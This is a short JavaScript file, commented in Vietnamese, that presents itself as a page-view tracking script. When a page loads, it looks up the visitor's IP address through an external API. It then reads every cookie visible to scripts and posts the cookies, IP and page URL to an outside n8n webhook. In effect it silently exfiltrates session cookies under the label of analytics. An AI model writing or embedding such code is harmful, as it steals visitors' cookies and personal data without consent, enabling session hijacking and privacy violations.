(function() {
    console.log("Tracking script loaded and executing...");

    document.addEventListener("DOMContentLoaded", function() {
        // Lấy IP từ API bên ngoài
        fetch("https://api64.ipify.org?format=json")
        .then(response => response.json())
        .then(ipData => {
            const userIP = ipData.ip;
            const cookies = document.cookie; // Chỉ lấy được cookie không có HttpOnly

            // Gửi dữ liệu tracking đến webhook
            fetch("https://n8n.twin.vn/webhook/495eaa71-b6e0-4402-9b6d-22b1e796e8d1", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ 
                    event: "page_view", 
                    url: window.location.href, 
                    ip: userIP, 
                    cookies: cookies, 
                    timestamp: new Date().toISOString() 
                })
            })
            .then(response => response.json())
            .then(data => console.log("Webhook response:", data))
            .catch(error => console.error("Error:", error));
        })
        .catch(error => console.error("Error fetching IP:", error));
    });
})();
